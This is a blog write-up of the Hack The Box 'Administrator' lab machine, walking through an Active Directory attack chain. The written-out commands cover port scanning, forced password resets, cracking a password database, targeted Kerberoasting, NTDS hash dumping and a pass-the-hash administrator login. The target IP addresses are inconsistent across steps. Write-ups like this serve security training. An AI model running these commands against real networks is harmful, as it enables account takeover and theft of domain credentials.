@@ -1,0 +1,188 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Medium Windows Machine"><title>HTB Administrator - Writeup</title><link rel=canonical href=https://solarspectre.github.io/p/htb-administrator-writeup/><link rel=stylesheet href=/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css><meta property='og:title' content="HTB Administrator - Writeup"><meta property='og:description' content="Medium Windows Machine"><meta property='og:url' content='https://solarspectre.github.io/p/htb-administrator-writeup/'><meta property='og:site_name' content='SolarSpectre'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='HTB'><meta property='article:tag' content='Medium'><meta property='article:tag' content='Windows'><meta property='article:published_time' content='2025-04-01T00:00:00+00:00'><meta property='article:modified_time' content='2025-04-01T00:00:00+00:00'><meta property='og:image' content='https://solarspectre.github.io/p/htb-administrator-writeup/cover.jpg'><meta name=twitter:title content="HTB Administrator - Writeup"><meta name=twitter:description content="Medium Windows Machine"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://solarspectre.github.io/p/htb-administrator-writeup/cover.jpg'><link rel="shortcut icon" href=/icon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_89b2309900f82078.png width=300 height=346 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎧</span></figure><div class=site-meta><h1 class=site-name><a href=/>SolarSpectre</a></h1><h2 class=site-description>Ethical Hacker and Software Dev</h2></div></header><ol class=menu-social><li><a href=https://bsky.app/profile/skyd3v.bsky.social target=_blank title=BlueSky rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bluesky"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.335 5.144C4.681 3.945 2 3.017 2 5.97c0 .59.35 4.953.556 5.661C3.269 14.094 5.686 14.381 8 14c-4.045.665-4.889 3.208-2.667 5.41C6.363 20.428 7.246 21 8 21c2 0 3.134-2.769 3.5-3.5.333-.667.5-1.167.5-1.5.0.333.167.833.5 1.5.366.731 1.5 3.5 3.5 3.5.754.0 1.637-.571 2.667-1.59C20.889 17.207 20.045 14.664 16 14c2.314.38 4.73.094 5.444-2.369.206-.708.556-5.072.556-5.661.0-2.953-2.68-2.025-4.335-.826C15.372 6.806 12.905 10.192 12 12c-.905-1.808-3.372-5.194-5.665-6.856z"/></svg></a></li><li><a href=https://github.com/SolarSpectre target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><ol><li><a href=#enumeration>Enumeration</a></li><li><a href=#user-flag>User Flag</a></li><li><a href=#root-flag>Root Flag</a></li><li><a href=#conclusion>Conclusion</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/htb-administrator-writeup/><img src=/p/htb-administrator-writeup/cover_hu_327e89a7304a0ed0.jpg srcset="/p/htb-administrator-writeup/cover_hu_327e89a7304a0ed0.jpg 800w, /p/htb-administrator-writeup/cover_hu_b4892740862dec54.jpg 1600w" width=800 height=425 loading=lazy alt="Featured image of post HTB Administrator - Writeup"></a></div><div class=article-details><header class=article-category><a href=/categories/writeups/ style=background-color:#248ad8;color:#fff>Writeups</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/htb-administrator-writeup/>HTB Administrator - Writeup</a></h2><h3 class=article-subtitle>Medium Windows Machine</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Apr 01, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>4 minute read</time></div></footer></div></header><section class=article-content><h3 id=enumeration>Enumeration</h3><p>Let&rsquo;s start with a scan to all ports:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo nmap -sS -p- --open --min-rate <span class=m>5000</span> -vvv -n -Pn 10.10.11.61 -oG allPorts
+</span></span></code></pre></td></tr></table></div></div><p>Here are the open ports</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>PORT      STATE SERVICE          REASON
+</span></span><span class=line><span class=cl>21/tcp    open  ftp              syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>53/tcp    open  domain           syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec     syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>135/tcp   open  msrpc            syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn      syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>389/tcp   open  ldap             syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds     syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5         syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>593/tcp   open  http-rpc-epmap   syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>636/tcp   open  ldapssl          syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>3268/tcp  open  globalcatLDAP    syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>3269/tcp  open  globalcatLDAPssl syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>5985/tcp  open  wsman            syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>9389/tcp  open  adws             syn-ack ttl <span class=m>127</span>
+</span></span><span class=line><span class=cl>47001/tcp open  winrm            syn-ack ttl <span class=m>127</span>
+</span></span></code></pre></td></tr></table></div></div><p>once it&rsquo;s finished, grep the ports and copy them to later scan them with nmap looking out for the versions of the services hosted.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sudo nmap -sC -sV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.11.42 -oN targeted
+</span></span><span class=line><span class=cl>Starting Nmap 7.95 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2025-04-11 16:52 EDT
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.42
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.26s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
+</span></span><span class=line><span class=cl>21/tcp    open  ftp           Microsoft ftpd
+</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst:
+</span></span><span class=line><span class=cl><span class=p>|</span>_  SYST: Windows_NT
+</span></span><span class=line><span class=cl>53/tcp    open  domain        Simple DNS Plus
+</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2025-04-12 03:52:41Z<span class=o>)</span>
+</span></span><span class=line><span class=cl>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class=line><span class=cl>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds?
+</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?
+</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class=line><span class=cl>636/tcp   open  tcpwrapped
+</span></span><span class=line><span class=cl>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl>3269/tcp  open  tcpwrapped
+</span></span><span class=line><span class=cl>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
+</span></span><span class=line><span class=cl>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class=line><span class=cl>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
+</span></span><span class=line><span class=cl>Service Info: Host: DC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
+</span></span></code></pre></td></tr></table></div></div><p>add the domain to your /etc/hosts file</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>10.10.11.61     administrator.htb dc.administrator.htb
+</span></span></code></pre></td></tr></table></div></div><p>Run netexec with the credentials from hackthebox</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>nxc winrm 10.10.11.42 -u Olivia -p ichliebedich
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>WINRM       10.10.11.42     <span class=m>5985</span>   DC               <span class=o>[</span>+<span class=o>]</span> administrator.htb<span class=se>\o</span>livia:ichliebedich <span class=o>(</span>Pwn3d!<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Login to the machine using evil-winrm and run SharpHound to look for Attack paths</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>evil-winrm -i 10.10.11.42 -u olivia -p <span class=s1>&#39;ichliebedich&#39;</span>
+</span></span><span class=line><span class=cl>upload SharpHound.exe
+</span></span></code></pre></td></tr></table></div></div><p>Once you ingested the data in bloodhound, you can see that olivia has GenericAll meaning she has full control over michael&rsquo;s account</p><p><img src=/p/htb-administrator-writeup/1.png width=768 height=193 srcset="/p/htb-administrator-writeup/1_hu_5452d1cb76675978.png 480w, /p/htb-administrator-writeup/1_hu_aff7a081dde9a9c1.png 1024w" loading=lazy alt="Image 1" class=gallery-image data-flex-grow=397 data-flex-basis=955px>
+And Michael Can ForceChangePassword of Benjamin</p><p><img src=/p/htb-administrator-writeup/2.png width=768 height=164 srcset="/p/htb-administrator-writeup/2_hu_7b78de711b72a0e2.png 480w, /p/htb-administrator-writeup/2_hu_67524f6fadb9ffaf.png 1024w" loading=lazy alt="Image 2" class=gallery-image data-flex-grow=468 data-flex-basis=1123px>
+To reset the password for these users you can use this commands</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>net rpc password <span class=s2>&#34;michael&#34;</span> <span class=s1>&#39;P@ssw00rd!231!!!&#39;</span> -U <span class=s2>&#34;administrator.htb&#34;</span>/<span class=s2>&#34;Olivia&#34;</span>%<span class=s1>&#39;ichliebedich&#39;</span> -S dc.administrator.htb
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>net rpc password <span class=s2>&#34;benjamin&#34;</span> <span class=s1>&#39;P@ssw00rd!555!!!&#39;</span> -U <span class=s2>&#34;administrator.htb&#34;</span>/<span class=s2>&#34;michael&#34;</span>%<span class=s1>&#39;P@ssw00rd!231!!!&#39;</span> -S dc.administrator.htb
+</span></span></code></pre></td></tr></table></div></div><h3 id=user-flag>User Flag</h3><p>With these accounts you can look for access to other services like smb or ftp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>nxc ftp 10.10.11.42 -u benjamin -p <span class=s1>&#39;P@ssw00rd!555!!!&#39;</span> --ls
+</span></span><span class=line><span class=cl>FTP         10.10.11.42     <span class=m>21</span>     10.10.11.42      <span class=o>[</span>*<span class=o>]</span> Banner: Microsoft FTP Service
+</span></span><span class=line><span class=cl>FTP         10.10.11.42     <span class=m>21</span>     10.10.11.42      <span class=o>[</span>+<span class=o>]</span> benjamin:P@ssw00rd!555!!!
+</span></span><span class=line><span class=cl>FTP         10.10.11.42     <span class=m>21</span>     10.10.11.42      <span class=o>[</span>*<span class=o>]</span> Directory Listing
+</span></span><span class=line><span class=cl>FTP         10.10.11.42     <span class=m>21</span>     10.10.11.42      10-05-24  09:13AM                  <span class=m>952</span> Backup.psafe3
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>nxc ftp 10.10.11.42 -u benjamin -p <span class=s1>&#39;P@ssw00rd!555!!!&#39;</span> --get Backup.psafe3
+</span></span></code></pre></td></tr></table></div></div><p>this is a password database file that&rsquo;s protected by a master password, to crack that password you can use john the ripper</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>pwsafe2john Backup.psafe3 &gt; psafe3.hash
+</span></span><span class=line><span class=cl>john psafe3.hash --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
+</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>pwsafe, Password Safe <span class=o>[</span>SHA256 256/256 AVX2 8x<span class=o>])</span>
+</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>2048</span> <span class=k>for</span> all loaded hashes
+</span></span><span class=line><span class=cl>Will run <span class=m>2</span> OpenMP threads
+</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
+</span></span><span class=line><span class=cl>tekieromucho     <span class=o>(</span>Backu<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>with this password, open the database with passwordsafe</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo apt install passwordsafe
+</span></span><span class=line><span class=cl>pwsafe Backup.psafe3
+</span></span></code></pre></td></tr></table></div></div><p>you can login as emily with evil-winrm</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>evil-winrm -i 10.10.11.42 -u emily -p PASSWORD
+</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\e</span>mily<span class=se>\D</span>esktop&gt; <span class=nb>type</span> user.txt
+</span></span><span class=line><span class=cl>XXXXXXXXXXXXXXXXXXXXXXXXXXX
+</span></span></code></pre></td></tr></table></div></div><h3 id=root-flag>Root Flag</h3><p>Looking for attack paths as emily in bloodhound you can find that she has GenericWrite access on Ethan&rsquo;s account, which means we can use this to do a targeted kerberoast attack to obtain the hash of ethan&rsquo;s account and crack it with johntheripper</p><p><img src=/p/htb-administrator-writeup/3.png width=768 height=201 srcset="/p/htb-administrator-writeup/3_hu_c44c08755ace5602.png 480w, /p/htb-administrator-writeup/3_hu_6c4b917d3779a5.png 1024w" loading=lazy alt="Image 3" class=gallery-image data-flex-grow=382 data-flex-basis=917px>
+Use faketime to sync your time with the DC and targetedKerberoast to execute the attack
+<a class=link href=https://github.com/ShutdownRepo/targetedKerberoast target=_blank rel=noopener>https://github.com/ShutdownRepo/targetedKerberoast</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>faketime <span class=s2>&#34;</span><span class=k>$(</span>ntpdate -q dc.administrator.htb <span class=p>|</span> grep -oP <span class=s1>&#39;\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}&#39;</span><span class=k>)</span><span class=s2>&#34;</span> python targetedKerberoast.py -d <span class=s2>&#34;administrator.htb&#34;</span> -u <span class=s2>&#34;emily&#34;</span> -p <span class=s2>&#34;XXXXXXXXXXXXXXXXXXXXX&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>And crack the hash with john</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>john hash.txt --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></td></tr></table></div></div><p>Now that we have access to ethan&rsquo;s account, we can dump the hashes for the administrator and obtain the root flag</p><p><img src=/p/htb-administrator-writeup/4.png width=768 height=271 srcset="/p/htb-administrator-writeup/4_hu_9a19eebed6ee0f32.png 480w, /p/htb-administrator-writeup/4_hu_5a21c04038ef84d7.png 1024w" loading=lazy alt="Image 4" class=gallery-image data-flex-grow=283 data-flex-basis=680px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>nxc smb 192.168.1.100 -u ethan -p <span class=s1>&#39;XXXXXXXXXXXXXX&#39;</span> --ntds --users administrator
+</span></span></code></pre></td></tr></table></div></div><p>Login with evil-winrm as administrator and get the flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>evil-winrm -i 10.10.11.42 -u administrator -H XXXXXXXXXXXXXXXXXXXXXXXXXX
+</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; <span class=nb>type</span> root.txt
+</span></span></code></pre></td></tr></table></div></div><h3 id=conclusion>Conclusion</h3><p>This machine covers topics like Kerberoasting, bloodhound, DCSync / Dump Hashes, GenericWrite, GenericAll,Password Cracking and Password Database leak</p><p><mark>Hope you enjoy it and Happy Hacking!</mark></p></section><footer class=article-footer><section class=article-tags><a href=/tags/htb/>HTB</a>
+<a href=/tags/medium/>Medium</a>
+<a href=/tags/windows/>Windows</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/htb-escape-two-writeup/><div class=article-image><img src=/p/htb-escape-two-writeup/cover.c243ca7c04af4d46f66c2abe9bf12115_hu_fc11167afeb674b5.png width=250 height=150 loading=lazy alt="Featured image of post HTB Escape Two - Writeup" data-hash="md5-wkPKfASvTUb2bCq+m/EhFQ=="></div><div class=article-details><h2 class=article-title>HTB Escape Two - Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-chemistry-writeup/><div class=article-image><img src=/p/htb-chemistry-writeup/cover.08235e3684e30a4be5236d43afff1aa4_hu_37fab3689dfe54b7.png width=250 height=150 loading=lazy alt="Featured image of post HTB Chemistry - Writeup" data-hash="md5-CCNeNoTjCkvlI21Dr/8apA=="></div><div class=article-details><h2 class=article-title>HTB Chemistry - Writeup</h2></div></a></article><article class=has-image><a href=/p/thm-root-me-writeup/><div class=article-image><img src=/p/thm-root-me-writeup/cover.720262efb8e2345a0ecdf3acda49e4db_hu_74259ad728e2174e.png width=250 height=150 loading=lazy alt="Featured image of post THM Root Me - Writeup" data-hash="md5-cgJi77jiNFoOzfOs2knk2w=="></div><div class=article-details><h2 class=article-title>THM Root Me - Writeup</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
